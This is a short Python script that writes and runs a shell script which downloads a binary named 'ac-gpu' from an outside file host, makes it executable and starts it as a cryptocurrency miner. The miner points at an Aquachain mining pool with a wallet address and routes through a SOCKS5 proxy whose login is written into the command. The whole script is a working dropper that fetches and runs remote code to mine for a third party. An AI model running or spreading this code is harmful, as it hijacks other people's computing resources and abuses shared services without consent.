import os
os.system('echo "#!/bin/sh" >> tes')
os.system('echo "wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && chmod +x ac-gpu" >> tes')
os.system('echo "./ac-gpu -F http://pool.aquachain.xyz:8888/0xa1ab79ade8b4d41d7c898a44521d567f59e8f082/mukidi -t 1 --proxy socks5://nofvbdys-rotate:44tpywm4q9bo@149.6.162.2:80" >> tes')
os.system('sleep 2')
os.system('sh tes')
